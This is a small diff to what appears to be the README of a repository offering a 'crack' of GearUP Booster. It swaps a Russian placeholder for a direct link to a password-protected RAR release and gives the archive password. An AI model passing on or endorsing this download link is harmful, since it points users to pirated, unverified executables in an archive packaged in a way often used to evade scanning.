@@ -10,7 +10,7 @@
   </p>
 ---
 
-# [Download]([ЗДЕСЬ САМ ССЫЛКУ ПОМЕНЯЕШЬ](https://github.com/maxxximgb/gearup-booster-crack/releases/download/Latest/GearUP.Booster.rar))
+# [Download](https://github.com/maxxximgb/gearup-booster-crack/releases/download/Latest/GearUP.Booster.rar)
 🔐 Password: code10
 
 ---
